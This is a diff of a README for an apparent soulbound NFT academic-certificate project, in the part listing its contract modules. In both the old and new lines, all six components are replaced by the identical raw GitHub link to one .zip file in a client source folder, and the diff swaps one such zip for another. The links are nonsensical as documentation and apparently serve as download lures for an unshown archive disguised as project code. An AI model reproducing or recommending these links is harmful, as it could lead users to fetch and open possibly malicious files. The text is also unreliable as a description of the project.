@@ -22,12 +22,12 @@ Soulbound NFTs are non-transferable tokens that remain bound to the recipient's 
 
 The system is built with a modular design:
 
-1. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/utils/academic-soulbound-certificates-nft-v1.6.zip**: Main contract that inherits all functionality.
-2. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/utils/academic-soulbound-certificates-nft-v1.6.zip**: Core data structures and Soulbound implementation.
-3. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/utils/academic-soulbound-certificates-nft-v1.6.zip**: Certificate issuance and management functions.
-4. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/utils/academic-soulbound-certificates-nft-v1.6.zip**: Bulk operations for efficiency.
-5. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/utils/academic-soulbound-certificates-nft-v1.6.zip**: Basic certificate queries.
-6. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/utils/academic-soulbound-certificates-nft-v1.6.zip**: Advanced filtering and queries.
+1. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/pages/certificates-soulbound-academic-nft-v3.1.zip**: Main contract that inherits all functionality.
+2. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/pages/certificates-soulbound-academic-nft-v3.1.zip**: Core data structures and Soulbound implementation.
+3. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/pages/certificates-soulbound-academic-nft-v3.1.zip**: Certificate issuance and management functions.
+4. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/pages/certificates-soulbound-academic-nft-v3.1.zip**: Bulk operations for efficiency.
+5. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/pages/certificates-soulbound-academic-nft-v3.1.zip**: Basic certificate queries.
+6. **https://raw.githubusercontent.com/midoo12345/soulbound-academic-nft-certificates/main/client/src/pages/certificates-soulbound-academic-nft-v3.1.zip**: Advanced filtering and queries.
 
 ## Certificate Data Structure
 
